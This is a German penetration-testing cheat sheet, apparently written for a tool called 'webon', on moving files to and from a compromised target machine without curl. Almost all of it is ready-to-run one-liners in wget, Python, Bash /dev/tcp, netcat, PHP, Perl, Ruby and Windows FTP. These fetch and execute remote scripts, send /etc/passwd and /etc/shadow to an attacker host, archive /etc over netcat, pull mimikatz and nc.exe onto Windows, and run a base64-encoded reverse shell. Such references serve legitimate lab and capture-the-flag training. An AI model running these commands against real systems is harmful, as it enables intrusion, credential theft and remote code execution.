# 🔄 Dateitransfer ohne curl

> Alternativen wenn `curl` auf der Zielmaschine nicht verfügbar ist.

---

## 📊 Schnellübersicht

| Tool | Download | Upload | Verfügbarkeit |
|------|:--------:|:------:|:-------------:|
| wget | ✅ | ✅ | Sehr hoch |
| Python | ✅ | ✅ | Sehr hoch |
| Bash /dev/tcp | ✅ | ✅ | Hoch |
| netcat | ✅ | ✅ | Mittel |
| PHP | ✅ | ✅ | Mittel |
| Perl | ✅ | ⚠️ | Mittel |
| Ruby | ✅ | ⚠️ | Niedrig |

---

## 🔍 Verfügbarkeit prüfen

```bash
which curl wget python python3 nc ncat php perl ruby
```

---

## 1️⃣ wget (Beste Alternative)

### Download

```bash
# Einfacher Download
wget http://10.10.14.5/linpeas.sh

# Mit Ausgabename
wget http://10.10.14.5/linpeas.sh -O lp.sh

# Direkt ausführen
wget -qO- http://10.10.14.5/linpeas.sh | bash

# Leise (keine Ausgabe)
wget -q http://10.10.14.5/file.sh

# Mehrere Dateien
wget http://10.10.14.5/{file1.sh,file2.sh,file3.sh}

# Rekursiv (ganzen Ordner)
wget -r http://10.10.14.5/tools/
```

### Upload

```bash
# Datei hochladen
wget --post-file=/etc/passwd http://10.10.14.5/passwd.txt

# Befehlsausgabe hochladen
ps aux | wget --post-data="$(cat -)" http://10.10.14.5/ps.txt -O-

# String hochladen
wget --post-data="$(cat /etc/shadow)" http://10.10.14.5/shadow.txt
```

### Beispiele für webon

```bash
# Download & Execute
wget -qO- 10.10.14.5/linpeas.sh | bash
wget -qO- 10.10.14.5/pspy64.b64 | base64 -d > /tmp/pspy && chmod +x /tmp/pspy

# Loot hochladen
wget --post-file=/etc/passwd http://10.10.14.5/passwd.txt
wget --post-file=/tmp/results.txt http://10.10.14.5/results.txt
```

---

## 2️⃣ Python

### Download - Python 3

```bash
# Einfacher Download
python3 -c "import urllib.request; urllib.request.urlretrieve('http://10.10.14.5/file.sh', 'file.sh')"

# Direkt ausführen
python3 -c "import urllib.request; exec(urllib.request.urlopen('http://10.10.14.5/script.py').read())"

# One-Liner Download
python3 -c "import urllib.request as u; u.urlretrieve('http://10.10.14.5/linpeas.sh','lp.sh')"
```

### Download - Python 2

```bash
# Einfacher Download
python -c "import urllib; urllib.urlretrieve('http://10.10.14.5/file.sh', 'file.sh')"

# Direkt ausführen
python -c "import urllib; exec(urllib.urlopen('http://10.10.14.5/script.py').read())"
```

### Upload - Python 3

```bash
# Datei hochladen
python3 -c "import urllib.request; urllib.request.urlopen(urllib.request.Request('http://10.10.14.5/data.txt', data=open('/etc/passwd','rb').read()))"

# Kurzform
python3 -c "import urllib.request as u; u.urlopen(u.Request('http://10.10.14.5/passwd.txt',open('/etc/passwd','rb').read()))"
```

### Upload - Python 2

```bash
python -c "import urllib2; urllib2.urlopen(urllib2.Request('http://10.10.14.5/data.txt', open('/etc/passwd').read()))"
```

### Python HTTP Server (Reverse)

```bash
# Auf Zielmaschine: Server starten
python3 -m http.server 8000      # Python 3
python -m SimpleHTTPServer 8000  # Python 2

# Von deinem PC herunterladen
wget http://TARGET:8000/loot.txt
```

### Beispiele für webon

```bash
# Download & Execute
python3 -c "import urllib.request as u; exec(u.urlopen('http://10.10.14.5/enum.py').read())"

# Binary herunterladen
python3 -c "import urllib.request as u; u.urlretrieve('http://10.10.14.5/chisel','chisel')"

# Loot hochladen
python3 -c "import urllib.request as u; u.urlopen(u.Request('http://10.10.14.5/shadow.txt',open('/etc/shadow','rb').read()))"
```

---

## 3️⃣ Bash /dev/tcp (Keine Tools nötig!)

> Funktioniert wenn Bash kompiliert wurde mit `--enable-net-redirections`

### Verfügbarkeit prüfen

```bash
timeout 2 bash -c "echo > /dev/tcp/8.8.8.8/53" && echo "OK" || echo "Blocked"
```

### Download

```bash
# Einfacher Download (mit HTTP Header)
exec 3<>/dev/tcp/10.10.14.5/80
echo -e "GET /linpeas.sh HTTP/1.0\r\nHost: 10.10.14.5\r\n\r\n" >&3
cat <&3 > response.txt

# Nur Dateiinhalt (Header entfernen)
exec 3<>/dev/tcp/10.10.14.5/80
echo -e "GET /linpeas.sh HTTP/1.0\r\n\r\n" >&3
sed '1,/^$/d' <&3 > linpeas.sh

# Direkt ausführen
exec 3<>/dev/tcp/10.10.14.5/80; echo -e "GET /script.sh HTTP/1.0\r\n\r\n" >&3; sed '1,/^$/d' <&3 | bash
```

### Upload

```bash
# Datei hochladen
exec 3<>/dev/tcp/10.10.14.5/80
DATA=$(cat /etc/passwd)
LEN=${#DATA}
echo -e "POST /passwd.txt HTTP/1.0\r\nHost: 10.10.14.5\r\nContent-Length: $LEN\r\n\r\n$DATA" >&3
cat <&3
```

### Download-Funktion (wiederverwendbar)

```bash
function download() {
    exec 3<>/dev/tcp/$1/$2
    echo -e "GET /$3 HTTP/1.0\r\n\r\n" >&3
    sed '1,/^$/d' <&3 > $3
    exec 3>&-
}

# Verwendung
download 10.10.14.5 80 linpeas.sh
download 10.10.14.5 80 pspy64
```

### Beispiele für webon

```bash
# Download & Execute
exec 3<>/dev/tcp/10.10.14.5/80; echo -e "GET /linpeas.sh HTTP/1.0\r\n\r\n" >&3; sed '1,/^$/d' <&3 | bash

# DDexec style
exec 3<>/dev/tcp/10.10.14.5/80; echo -e "GET /shell.b64 HTTP/1.0\r\n\r\n" >&3; sed '1,/^$/d' <&3 | base64 -d | bash
```

---

## 4️⃣ netcat (nc)

### Download

```bash
# Auf deinem PC (Sender)
nc -lvnp 4444 < linpeas.sh

# Auf Zielmaschine (Empfänger)
nc 10.10.14.5 4444 > linpeas.sh
```

### Upload

```bash
# Auf deinem PC (Empfänger)
nc -lvnp 4444 > loot.txt

# Auf Zielmaschine (Sender)
nc 10.10.14.5 4444 < /etc/passwd
cat /etc/passwd | nc 10.10.14.5 4444
```

### Mehrere Dateien (tar)

```bash
# Auf deinem PC (Empfänger)
nc -lvnp 4444 | tar xzf -

# Auf Zielmaschine (Sender)
tar czf - /etc /var/log | nc 10.10.14.5 4444
```

### Varianten

```bash
# ncat (Nmap)
ncat -lvnp 4444 < file.sh
ncat 10.10.14.5 4444 > file.sh

# nc.traditional
nc.traditional -lvnp 4444 < file.sh

# Mit Timeout
timeout 10 nc 10.10.14.5 4444 > file.sh
```

### Beispiele für webon

```bash
# Da webon HTTP/FTP ist, nutze nc für direkte Transfers:

# Auf deinem PC
nc -lvnp 9001 < linpeas.sh

# Auf Zielmaschine
nc 10.10.14.5 9001 > /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh
```

---

## 5️⃣ PHP

### Download

```bash
# Einfacher Download
php -r "file_put_contents('file.sh', file_get_contents('http://10.10.14.5/file.sh'));"

# Direkt ausführen
php -r "eval(file_get_contents('http://10.10.14.5/script.php'));"

# Kurzform
php -r "copy('http://10.10.14.5/linpeas.sh','lp.sh');"
```

### Upload

```bash
# Datei hochladen
php -r "file_get_contents('http://10.10.14.5/data.txt', false, stream_context_create(['http'=>['method'=>'POST','content'=>file_get_contents('/etc/passwd')]]));"

# Kurzform
php -r "\$c=stream_context_create(['http'=>['method'=>'POST','content'=>file_get_contents('/etc/passwd')]]);file_get_contents('http://10.10.14.5/passwd.txt',0,\$c);"
```

### Beispiele für webon

```bash
# Download & Execute
php -r "eval(file_get_contents('http://10.10.14.5/enum.php'));"

# Binary herunterladen
php -r "copy('http://10.10.14.5/chisel','chisel');chmod('chisel',0755);"

# Loot hochladen
php -r "\$c=stream_context_create(['http'=>['method'=>'POST','content'=>file_get_contents('/etc/shadow')]]);file_get_contents('http://10.10.14.5/shadow.txt',0,\$c);"
```

---

## 6️⃣ Perl

### Download

```bash
# Mit LWP::Simple
perl -e 'use LWP::Simple; getstore("http://10.10.14.5/file.sh", "file.sh");'

# Direkt ausführen
perl -e 'use LWP::Simple; eval(get("http://10.10.14.5/script.pl"));'

# Ohne LWP
perl -MIO::Socket::INET -e '$s=IO::Socket::INET->new("10.10.14.5:80");print $s "GET /file.sh HTTP/1.0\r\n\r\n";while(<$s>){print}'
```

### Upload

```bash
perl -e 'use LWP::UserAgent;$ua=LWP::UserAgent->new;$ua->post("http://10.10.14.5/data.txt",Content=>join("",<>));' < /etc/passwd
```

---

## 7️⃣ Ruby

### Download

```bash
# Einfacher Download
ruby -e 'require "open-uri"; File.write("file.sh", URI.open("http://10.10.14.5/file.sh").read)'

# Direkt ausführen
ruby -e 'require "open-uri"; eval(URI.open("http://10.10.14.5/script.rb").read)'

# Alternative
ruby -rnet/http -e 'File.write("file.sh", Net::HTTP.get(URI("http://10.10.14.5/file.sh")))'
```

---

## 8️⃣ FTP (Windows!)

> FTP.exe ist auf **jedem Windows** vorhanden!

### Interaktiv

```cmd
ftp 10.10.14.5
> anonymous
> anonymous
> binary
> get nc.exe
> get mimikatz.exe
> put sam.hiv
> bye
```

### Nicht-interaktiv (Script)

```cmd
REM ftp_commands.txt erstellen
echo open 10.10.14.5 > ftp.txt
echo anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo get nc.exe >> ftp.txt
echo bye >> ftp.txt

REM Ausführen
ftp -n -s:ftp.txt
```

### One-Liner (CMD)

```cmd
echo open 10.10.14.5>x&echo anonymous>>x&echo anonymous>>x&echo binary>>x&echo get nc.exe>>x&echo bye>>x&ftp -n -s:x
```

### Beispiele für webon

```bash
# Auf deinem PC (FTP starten)
sudo webon -o /opt/tools --ftp
```

```cmd
REM Auf Windows-Zielmaschine
echo open 10.10.14.5>x&echo anonymous>>x&echo anonymous>>x&echo binary>>x&echo get nc.exe>>x&echo bye>>x&ftp -n -s:x
```

---

## 9️⃣ SCP/SSH

### Download

```bash
scp user@10.10.14.5:/opt/tools/linpeas.sh ./linpeas.sh
ssh user@10.10.14.5 'cat /opt/tools/linpeas.sh' > linpeas.sh
```

### Upload

```bash
scp /etc/passwd user@10.10.14.5:/tmp/passwd.txt
cat /etc/passwd | ssh user@10.10.14.5 'cat > /tmp/passwd.txt'
```

---

## 🔟 Base64 (Für kleine Dateien)

### Auf deinem PC

```bash
# Datei kodieren
base64 -w0 linpeas.sh > linpeas.b64

# Auf Webserver stellen
cp linpeas.b64 /opt/tools/
```

### Auf Zielmaschine

```bash
# Herunterladen und dekodieren
curl 10.10.14.5/linpeas.b64 | base64 -d > linpeas.sh
wget -qO- 10.10.14.5/linpeas.b64 | base64 -d > linpeas.sh

# Direkt ausführen
curl 10.10.14.5/linpeas.b64 | base64 -d | bash
```

### Beispiele für webon (DDexec Style)

```bash
# Binary base64 kodieren
base64 -w0 /opt/tools/reverse_shell > /opt/tools/shell.b64

# Auf Zielmaschine ausführen
curl 10.10.14.5/shell.b64 | base64 -d | bash
curl 10.10.14.5/shell.b64 | bash <(curl 10.10.14.5/ddexec.sh) /bin/bash
```

---

## 📋 Quick Reference Card

### Download

```bash
# wget
wget -qO- 10.10.14.5/script.sh | bash

# Python 3
python3 -c "import urllib.request as u;exec(u.urlopen('http://10.10.14.5/s.py').read())"

# Bash
exec 3<>/dev/tcp/10.10.14.5/80;echo -e "GET /s.sh HTTP/1.0\r\n\r\n">&3;sed '1,/^$/d'<&3|bash

# PHP
php -r "eval(file_get_contents('http://10.10.14.5/s.php'));"
```

### Upload

```bash
# wget
wget --post-file=/etc/passwd http://10.10.14.5/passwd.txt

# Python 3
python3 -c "import urllib.request as u;u.urlopen(u.Request('http://10.10.14.5/p.txt',open('/etc/passwd','rb').read()))"

# netcat
cat /etc/passwd | nc 10.10.14.5 4444
```

---

## 🎯 Prioritätsliste

1. ✅ **wget** - Fast immer vorhanden
2. ✅ **Python** - Sehr zuverlässig
3. ✅ **Bash /dev/tcp** - Keine externen Tools
4. ✅ **netcat** - Gut für große Dateien
5. ⚠️ **PHP** - Nur auf Webservern
6. ⚠️ **Perl/Ruby** - Seltener
7. 🔄 **Base64** - Notlösung

---

## 💡 Tipps

### HTTP-Header entfernen (Bash)

```bash
sed '1,/^$/d' response.txt > file.sh
awk '/^$/{p=1;next}p' response.txt > file.sh
```

### Prüfen ob Download funktioniert hat

```bash
file linpeas.sh          # Datei-Typ
ls -la linpeas.sh        # Größe
md5sum linpeas.sh        # Hash vergleichen
chmod +x linpeas.sh      # Ausführbar machen
```

---

**Speichere diese Datei auf deinem System für schnellen Zugriff!** 📌
